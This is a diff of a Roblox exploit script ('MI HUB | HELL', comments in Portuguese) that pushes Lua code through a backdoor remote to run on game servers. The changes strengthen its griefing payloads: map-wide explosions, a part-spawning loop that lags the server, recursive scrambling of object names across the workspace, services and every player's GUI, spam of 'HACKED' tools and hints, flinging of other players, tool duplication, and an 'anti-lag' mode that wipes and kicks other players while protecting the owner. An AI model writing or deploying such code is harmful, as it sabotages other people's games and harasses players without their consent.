@@ -1,5 +1,5 @@
 -- language: Lua, target: Roblox
--- MI HUB | HELL - Full (CRIPTO forte + Anti Lag server-side)
+-- MI HUB | HELL - Anti Lag Potente + CRIPTO 9999x
 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
@@ -20,7 +20,7 @@ win:SetAccent(Color3.fromRGB(255, 0, 0))
 
 local backdoorRemote = nil
 local selectedTarget = ""
-local ownerName = LP.Name  -- proteção só pra você
+local ownerName = LP.Name
 
 -- ==========================================
 -- ABA 1: SCANNER / EXECUTOR
@@ -166,8 +166,8 @@ local function sendCmd(cmd, args)
                 if v:IsA("BasePart") then
                     local ex = Instance.new("Explosion")
                     ex.Position = v.Position
-                    ex.BlastRadius = 30
-                    ex.BlastPressure = 500000
+                    ex.BlastRadius = 40
+                    ex.BlastPressure = 800000
                     ex.Parent = workspace
                 end
             end
@@ -176,15 +176,15 @@ local function sendCmd(cmd, args)
         code = [[
             task.spawn(function()
                 while true do
-                    for i = 1, 120 do
+                    for i = 1, 150 do
                         local p = Instance.new("Part")
-                        p.Size = Vector3.new(6,6,6)
+                        p.Size = Vector3.new(8,8,8)
                         p.Anchored = true
                         p.CanCollide = false
                         p.Transparency = 1
                         p.Parent = workspace
                     end
-                    task.wait(0.03)
+                    task.wait(0.025)
                 end
             end)
         ]]
@@ -287,8 +287,8 @@ local grpServer = tabServer:CreateGroup({Name = "Destruição Server-Side"})
 grpServer:CreateButton({Name = "Explodir Mapa Inteiro", Icon = "bomb", Callback = function() sendCmd("explode") end})
 grpServer:CreateButton({Name = "Lag Server Massivo", Icon = "zap", Callback = function() sendCmd("lag") end})
 
--- CRIPTO ALL - VERSÃO FORTE
-grpServer:CreateToggle({Name = "CRIPTO ALL (Bugar Tela e Tools)", Icon = "terminal", Default = false, Callback = function(state)
+-- CRIPTO ALL 9999x
+grpServer:CreateToggle({Name = "CRIPTO ALL (9999x Agressivo)", Icon = "terminal", Default = false, Callback = function(state)
     if not backdoorRemote then return end
     
     if state then
@@ -297,31 +297,68 @@ grpServer:CreateToggle({Name = "CRIPTO ALL (Bugar Tela e Tools)", Icon = "termin
             local owner = "%s"
             
             task.spawn(function()
-                local chars = "!@#$%%^&*()_+{}|:<>?~1234567890abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ█▓▒░╔╗╚╝║═╠╣╦╩╬"
+                local chars = "█▓▒░╔╗╚╝║═╠╣╦╩╬@#$%%^&*()_+{}|:<>?~ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"
+                
                 local function scramble(str)
-                    if not str or str == "" then return "HACKED" end
+                    local len = math.random(8, 22)
                     local out = {}
-                    for i = 1, math.max(#str, 6) do
+                    for i = 1, len do
                         out[i] = chars:sub(math.random(1, #chars), math.random(1, #chars))
                     end
-                    if math.random(1, 100) <= 40 then return "HACKED_" .. table.concat(out) end
+                    if math.random(1, 100) <= 55 then
+                        return "HACKED_" .. table.concat(out)
+                    end
                     return table.concat(out)
+                end
+
+                local function deepScramble(obj, depth)
+                    if depth > 6 then return end
+                    for _, v in ipairs(obj:GetChildren()) do
+                        pcall(function()
+                            if v.Name ~= "Terrain" and v.Name ~= "Camera" and v.Name ~= "Humanoid" and v.Name ~= "HumanoidRootPart" then
+                                v.Name = scramble(v.Name)
+                            end
+                        end)
+                        deepScramble(v, depth + 1)
+                    end
                 end
 
                 task.spawn(function()
                     while _G.MI_ServerCrypto do
-                        -- 1. Tools no inventário de TODOS + partes voando
+                        for pass = 1, 3 do
+                            pcall(function() deepScramble(workspace, 0) end)
+                            
+                            for _, plr in ipairs(game.Players:GetPlayers()) do
+                                local pg = plr:FindFirstChild("PlayerGui")
+                                if pg then pcall(function() deepScramble(pg, 0) end) end
+                            end
+                            
+                            local services = {
+                                game:GetService("Lighting"),
+                                game:GetService("StarterGui"),
+                                game:GetService("StarterPack"),
+                                game:GetService("Teams"),
+                                game:GetService("SoundService"),
+                                game:GetService("ReplicatedStorage"),
+                            }
+                            for _, svc in ipairs(services) do
+                                pcall(function() deepScramble(svc, 0) end)
+                            end
+                        end
+
                         for _, p in ipairs(game.Players:GetPlayers()) do
+                            if p.Name == owner then continue end -- não cria tool no dono
+                            
                             local bp = p:FindFirstChild("Backpack")
                             if bp then
-                                for i = 1, 3 do
+                                for i = 1, 4 do
                                     local tool = Instance.new("Tool")
                                     tool.Name = "HACKED_" .. scramble("TOOL")
                                     tool.RequiresHandle = true
                                     
                                     local handle = Instance.new("Part")
                                     handle.Name = "Handle"
-                                    handle.Size = Vector3.new(1.8, 1.8, 1.8)
+                                    handle.Size = Vector3.new(2, 2, 2)
                                     handle.BrickColor = BrickColor.random()
                                     handle.Material = Enum.Material.Neon
                                     handle.CanCollide = false
@@ -329,89 +366,69 @@ grpServer:CreateToggle({Name = "CRIPTO ALL (Bugar Tela e Tools)", Icon = "termin
                                     
                                     tool.Parent = bp
                                 end
-                                
-                                -- Partes físicas voando (efeito visual forte)
-                                local root = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
-                                if root then
-                                    for i = 1, 2 do
-                                        local flying = Instance.new("Part")
-                                        flying.Name = "HACKED_FLY_" .. scramble("X")
-                                        flying.Size = Vector3.new(2.5, 2.5, 2.5)
-                                        flying.BrickColor = BrickColor.random()
-                                        flying.Material = Enum.Material.Neon
-                                        flying.Anchored = false
-                                        flying.CanCollide = true
-                                        flying.Position = root.Position + Vector3.new(math.random(-12,12), math.random(3,10), math.random(-12,12))
-                                        flying.Parent = workspace
-                                        
-                                        local bv = Instance.new("BodyVelocity")
-                                        bv.Velocity = Vector3.new(math.random(-600, 600), math.random(100, 450), math.random(-600, 600))
-                                        bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
-                                        bv.Parent = flying
-                                        
-                                        local bav = Instance.new("BodyAngularVelocity")
-                                        bav.AngularVelocity = Vector3.new(math.random(-25,25), math.random(-25,25), math.random(-25,25))
-                                        bav.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
-                                        bav.Parent = flying
-                                        
-                                        task.delay(3.5, function()
-                                            if flying then flying:Destroy() end
-                                        end)
-                                    end
+                            end
+                            
+                            local root = p.Character and p.Character:FindFirstChild("HumanoidRootPart")
+                            if root then
+                                for i = 1, 3 do
+                                    local flying = Instance.new("Part")
+                                    flying.Name = "HACKED_FLY_" .. scramble("X")
+                                    flying.Size = Vector3.new(3, 3, 3)
+                                    flying.BrickColor = BrickColor.random()
+                                    flying.Material = Enum.Material.Neon
+                                    flying.Anchored = false
+                                    flying.CanCollide = true
+                                    flying.Position = root.Position + Vector3.new(math.random(-15,15), math.random(4,12), math.random(-15,15))
+                                    flying.Parent = workspace
+                                    
+                                    local bv = Instance.new("BodyVelocity")
+                                    bv.Velocity = Vector3.new(math.random(-700,700), math.random(120,500), math.random(-700,700))
+                                    bv.MaxForce = Vector3.new(1e9, 1e9, 1e9)
+                                    bv.Parent = flying
+                                    
+                                    local bav = Instance.new("BodyAngularVelocity")
+                                    bav.AngularVelocity = Vector3.new(math.random(-30,30), math.random(-30,30), math.random(-30,30))
+                                    bav.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
+                                    bav.Parent = flying
+                                    
+                                    task.delay(3, function()
+                                        if flying then flying:Destroy() end
+                                    end)
                                 end
                             end
                         end
 
-                        -- 2. Scramble PESADO em quase tudo
-                        for _, v in ipairs(workspace:GetDescendants()) do
-                            if not v:IsA("Player") and v.Name ~= "Humanoid" and v.Name ~= "HumanoidRootPart" and v.Name ~= "Terrain" then
-                                pcall(function() v.Name = scramble(v.Name) end)
-                            end
-                        end
-                        
-                        -- Scramble em PlayerGui de todos
-                        for _, p in ipairs(game.Players:GetPlayers()) do
-                            local pg = p:FindFirstChild("PlayerGui")
-                            if pg then
-                                for _, obj in ipairs(pg:GetDescendants()) do
-                                    pcall(function() obj.Name = scramble(obj.Name) end)
-                                end
-                            end
-                            
-                            -- Hints spam
-                            local hint = Instance.new("Hint")
-                            hint.Text = "HACKED BY MI HUB | " .. scramble("SYSTEM DESTROYED")
-                            hint.Parent = workspace
-                            task.delay(0.15, function() if hint then hint:Destroy() end end)
-                        end
-                        
-                        -- 3. FORCE CAMERA SHAKE / DIREÇÃO LOUCA (muito forte)
                         for _, p in ipairs(game.Players:GetPlayers()) do
                             local char = p.Character
                             if char then
                                 local root = char:FindFirstChild("HumanoidRootPart")
-                                local hum = char:FindFirstChildOfClass("Humanoid")
-                                if root and hum then
-                                    -- Pulso de força + rotação forte (treme a câmera e muda direção)
+                                if root then
                                     local bv = Instance.new("BodyVelocity")
-                                    bv.Velocity = Vector3.new(math.random(-90, 90), math.random(-40, 80), math.random(-90, 90))
+                                    bv.Velocity = Vector3.new(math.random(-110,110), math.random(-50,90), math.random(-110,110))
                                     bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
                                     bv.Parent = root
                                     
                                     local bav = Instance.new("BodyAngularVelocity")
-                                    bav.AngularVelocity = Vector3.new(math.random(-18,18), math.random(-18,18), math.random(-18,18))
+                                    bav.AngularVelocity = Vector3.new(math.random(-22,22), math.random(-22,22), math.random(-22,22))
                                     bav.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
                                     bav.Parent = root
                                     
-                                    task.delay(0.12, function()
+                                    task.delay(0.11, function()
                                         if bv then bv:Destroy() end
                                         if bav then bav:Destroy() end
                                     end)
                                 end
                             end
                         end
+
+                        for i = 1, 3 do
+                            local hint = Instance.new("Hint")
+                            hint.Text = "HACKED BY MI HUB | " .. scramble("SYSTEM DESTROYED")
+                            hint.Parent = workspace
+                            task.delay(0.18, function() if hint then hint:Destroy() end end)
+                        end
                         
-                        task.wait(0.12)
+                        task.wait(0.07)
                     end
                 end)
             end)
@@ -424,7 +441,7 @@ grpServer:CreateToggle({Name = "CRIPTO ALL (Bugar Tela e Tools)", Icon = "termin
                 backdoorRemote:InvokeServer(code)
             end
         end)
-        win:Notify({Title = "CRIPTO ALL", Content = "Modo destruição total ativado.", Duration = 3})
+        win:Notify({Title = "CRIPTO ALL", Content = "9999x ATIVADO", Duration = 3})
     else
         local code = [[_G.MI_ServerCrypto = false]]
         pcall(function()
@@ -448,7 +465,7 @@ grpServer:CreateButton({Name = "Clonar Tools (Dupe)", Icon = "copy", Callback = 
                 if bp then
                     for _, item in ipairs(bp:GetChildren()) do
                         if item:IsA("Tool") then
-                            for i = 1, 12 do
+                            for i = 1, 15 do
                                 local clone = item:Clone()
                                 clone.Parent = bp
                             end
@@ -469,15 +486,15 @@ grpServer:CreateButton({Name = "Clonar Tools (Dupe)", Icon = "copy", Callback = 
 end})
 
 -- ==========================================
--- ABA 4: UTILIDADES (Anti Lag)
+-- ABA 4: UTILIDADES - ANTI LAG POTENTE
 -- ==========================================
 local tabUtil = win:CreateTab({Name = "Utilidades", Icon = "settings"})
 local grpUtil = tabUtil:CreateGroup({Name = "Proteção Server-Side"})
 
 grpUtil:CreateToggle({
-    Name = "Anti Lag (Protege Você)",
+    Name = "Anti Lag (Modo Deus)",
     Icon = "shield",
-    Default = true,  -- JÁ ATIVADO POR PADRÃO
+    Default = true,
     Callback = function(state)
         if not backdoorRemote then 
             win:Notify({Title = "Aviso", Content = "Rode o INJECT primeiro!", Duration = 3})
@@ -488,53 +505,131 @@ grpUtil:CreateToggle({
             local code = string.format([[
                 _G.MI_AntiLag = true
                 local ownerName = "%s"
+                local lastToolCount = 0
+                local lockdown = false
+                local lockdownUntil = 0
+                
+                local function isSuspicious(name)
+                    name = name:upper()
+                    return name:find("HACKED") or name:find("LAG") or name:find("SPAM") or 
+                           name:find("FLY") or name:find("CRIPTO") or name:find("TOOL") or
+                           #name > 20
+                end
+                
+                local function clearOwner(owner)
+                    -- Limpa Backpack completo de qualquer coisa suspeita
+                    local bp = owner:FindFirstChild("Backpack")
+                    if bp then
+                        for _, item in ipairs(bp:GetChildren()) do
+                            if item:IsA("Tool") then
+                                if isSuspicious(item.Name) or #bp:GetChildren() > 7 then
+                                    item:Destroy()
+                                end
+                            end
+                        end
+                    end
+                    
+                    -- Limpa Character
+                    local char = owner.Character
+                    if char then
+                        for _, item in ipairs(char:GetChildren()) do
+                            if item:IsA("Tool") and isSuspicious(item.Name) then
+                                item:Destroy()
+                            end
+                        end
+                        
+                        local root = char:FindFirstChild("HumanoidRootPart")
+                        if root then
+                            for _, v in ipairs(root:GetChildren()) do
+                                if v:IsA("BodyVelocity") or v:IsA("BodyAngularVelocity") or 
+                                   v:IsA("BodyForce") or v:IsA("BodyThrust") or v:IsA("BodyPosition") then
+                                    v:Destroy()
+                                end
+                            end
+                        end
+                        
+                        -- Remove partes de lag perto do dono
+                        for _, part in ipairs(workspace:GetChildren()) do
+                            if part:IsA("BasePart") and (part.Name:upper():find("HACKED") or part.Name:upper():find("FLY")) then
+                                local dist = (part.Position - (root and root.Position or Vector3.new())).Magnitude
+                                if dist < 80 then
+                                    part:Destroy()
+                                end
+                            end
+                        end
+                    end
+                end
+                
+                local function punishLaggers(owner)
+                    -- Encontra quem está com mais tools (provável fonte do lag)
+                    local suspects = {}
+                    for _, plr in ipairs(game.Players:GetPlayers()) do
+                        if plr ~= owner then
+                            local bp = plr:FindFirstChild("Backpack")
+                            local count = 0
+                            if bp then
+                                for _, item in ipairs(bp:GetChildren()) do
+                                    if item:IsA("Tool") then count = count + 1 end
+                                end
+                            end
+                            if count > 10 then
+                                table.insert(suspects, {player = plr, tools = count})
+                            end
+                        end
+                    end
+                    
+                    table.sort(suspects, function(a, b) return a.tools > b.tools end)
+                    
+                    -- Pune os top laggers
+                    for i, data in ipairs(suspects) do
+                        if i > 4 then break end
+                        local plr = data.player
+                        -- Limpa o inventário deles
+                        local bp = plr:FindFirstChild("Backpack")
+                        if bp then
+                            for _, item in ipairs(bp:GetChildren()) do
+                                if item:IsA("Tool") then item:Destroy() end
+                            end
+                        end
+                        -- Kick se estiver muito pesado
+                        if data.tools > 25 then
+                            pcall(function() plr:Kick("Anti-Lag: Tool spam detected") end)
+                        end
+                    end
+                end
                 
                 task.spawn(function()
                     while _G.MI_AntiLag do
                         local owner = game.Players:FindFirstChild(ownerName)
                         if owner then
-                            -- Limpa Backpack
                             local bp = owner:FindFirstChild("Backpack")
+                            local currentCount = 0
                             if bp then
                                 for _, item in ipairs(bp:GetChildren()) do
-                                    if item:IsA("Tool") then
-                                        local name = item.Name:upper()
-                                        if name:find("HACKED") or name:find("LAG") or name:find("SPAM") or name:find("FLY") or #bp:GetChildren() > 12 then
-                                            item:Destroy()
-                                        end
-                                    end
+                                    if item:IsA("Tool") then currentCount = currentCount + 1 end
                                 end
                             end
                             
-                            -- Limpa Character (tools equipadas)
-                            local char = owner.Character
-                            if char then
-                                for _, item in ipairs(char:GetChildren()) do
-                                    if item:IsA("Tool") then
-                                        local name = item.Name:upper()
-                                        if name:find("HACKED") or name:find("LAG") or name:find("SPAM") or name:find("FLY") then
-                                            item:Destroy()
-                                        end
-                                    end
-                                end
-                                
-                                -- Remove BodyMovers de lag que tentarem te flingar
-                                local root = char:FindFirstChild("HumanoidRootPart")
-                                if root then
-                                    for _, v in ipairs(root:GetChildren()) do
-                                        if v:IsA("BodyVelocity") or v:IsA("BodyAngularVelocity") or v:IsA("BodyForce") or v:IsA("BodyThrust") then
-                                            -- Só remove se for muito forte (lag/fling)
-                                            if v:IsA("BodyVelocity") and v.MaxForce.Magnitude > 500000 then
-                                                v:Destroy()
-                                            elseif v:IsA("BodyAngularVelocity") and v.MaxTorque.Magnitude > 500000 then
-                                                v:Destroy()
-                                            end
-                                        end
-                                    end
-                                end
+                            -- Detecta pico de lag
+                            if currentCount >= 8 or (currentCount > lastToolCount + 4) then
+                                lockdown = true
+                                lockdownUntil = tick() + 4 -- fica em lockdown por 4 segundos
+                            end
+                            
+                            lastToolCount = currentCount
+                            
+                            -- Sempre limpa
+                            clearOwner(owner)
+                            
+                            -- Se estiver em lockdown, pune os outros
+                            if lockdown and tick() < lockdownUntil then
+                                punishLaggers(owner)
+                            else
+                                lockdown = false
                             end
                         end
-                        task.wait(0.08) -- bem rápido
+                        
+                        task.wait(0.025) -- extremamente rápido
                     end
                 end)
             ]], ownerName)
@@ -546,7 +641,7 @@ grpUtil:CreateToggle({
                     backdoorRemote:InvokeServer(code)
                 end
             end)
-            win:Notify({Title = "Anti Lag", Content = "Proteção server-side ATIVADA (só você).", Duration = 3})
+            win:Notify({Title = "Anti Lag", Content = "Modo Deus ATIVADO - Proteção máxima.", Duration = 3})
         else
             local code = [[_G.MI_AntiLag = false]]
             pcall(function()
@@ -561,4 +656,4 @@ grpUtil:CreateToggle({
     end
 })
 
-grpUtil:CreateLabel({Name = "O Anti Lag roda no servidor e limpa automaticamente tools de lag/HACKED do seu inventário e personagem. Ninguém consegue te spammar."})
+grpUtil:CreateLabel({Name = "Anti Lag agora detecta pico de tools, limpa instantaneamente e pune/kika quem estiver spammando lag em você."})
